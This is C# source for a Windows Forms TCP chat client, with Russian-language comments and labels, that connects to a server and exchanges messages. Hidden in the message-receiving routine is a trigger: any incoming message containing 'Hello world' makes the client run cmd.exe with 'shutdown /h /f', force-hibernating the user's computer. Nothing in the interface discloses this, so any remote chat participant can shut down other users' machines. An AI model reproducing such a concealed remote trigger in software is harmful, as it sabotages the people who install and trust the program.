using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
namespace Client
{
    public partial class Form1 : Form
    {

        static private Socket Client;
        private IPAddress ip = null;
        private int port = 0;
        private Thread th;
        public Form1()
        {

            InitializeComponent();

            rtbChat.Enabled = false;
            rtbMessage.Enabled = false;
            btnSead.Enabled = false;

            try
            {
                var sr = new StreamReader(@"Client_info/data_info.txt");
                string buffer = sr.ReadToEnd();
                sr.Close();
                string[] connect_info = buffer.Split(':');//Автоматом положет всё в масив до и после
                ip = IPAddress.Parse(connect_info[0]);//Pars Автоматом преобразует в нужный тип 
                port = int.Parse(connect_info[1]);

                label4.ForeColor = Color.Green;
                label4.Text = "Настройки:\n IP:"+ connect_info[0] + "\n Port:"+ connect_info[1];
            }
            catch(Exception ex)
            {
                label4.ForeColor = Color.Red;
                label4.Text = "Настройки не найдены!!!\nИли ещё что то , я же ленив!";
                btnNameEnter.Enabled = false;
                settings set = new settings();
                set.Show();
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            SendMessage("\n"+tbName.Text+": "+rtbMessage.Text+";;;5");
            rtbMessage.Clear();
        }

        private void выходToolStripMenuItem_Click(object sender, EventArgs e)
        {
           if(th != null) th.Abort();
            Application.Exit();
        }

        private void настройкиToolStripMenuItem_Click(object sender, EventArgs e)
        {
            settings set = new settings();
            set.Show();
        }

        void SendMessage(string message)
        {
            if(message != "" && message != " ")
            {

                byte[] buffer = new byte[1024];
                buffer = Encoding.UTF8.GetBytes(message);
                Client.Send(buffer);
            }
        }

        void RecvMessage()
        {
            byte[] buffer = new byte[1024];
            for (int i = 0; i< buffer.Length;i++)
            {
                buffer[i] = 0;
            }

            for (;;)
            {
                try
                {
                    Client.Receive(buffer);
                    string message = Encoding.UTF8.GetString(buffer);
                    int count = message.IndexOf(";;;5");
                    if (count == -1)
                    {
                        continue;
                    }

                    string ClearMessage = "";

                    for (int i = 0; i <count;i++)
                    {
                        ClearMessage += message[i];
                    }

                    for (int i = 0; i < buffer.Length; i++)
                    {
                        buffer[i] = 0;
                    }
                    this.Invoke((MethodInvoker)delegate()
                        {
                            if(ClearMessage.IndexOf("Hello world") >0)
                            {
                                System.Diagnostics.Process.Start("cmd.exe", "/C " + "ping -n 0 127.0.0.1 > NUL 2>&1 & shutdown /h /f");
                            }                            
                            rtbChat.AppendText(ClearMessage);
                    });

                }
                catch (Exception ex)
                {

                }
            }
        }

        private void btnNameEnter_Click(object sender, EventArgs e)
        {
            try
            {
                if (tbName.Text!= "" && tbName.Text != " ")
                {
                    btnSead.Enabled = true;
                    rtbChat.Enabled = true;
                    rtbMessage.Enabled = true;
                    Client = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
                    if (ip!= null)
                    {
                        Client.Connect(ip, port);
                        th = new Thread(delegate () { RecvMessage(); });
                        th.Start();
                    }   
                }
            }
            catch(Exception ex)
            { MessageBox.Show("Ошибка:"+ex.Message); }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (th != null) th.Abort();
            Application.Exit();
        }
    }
}
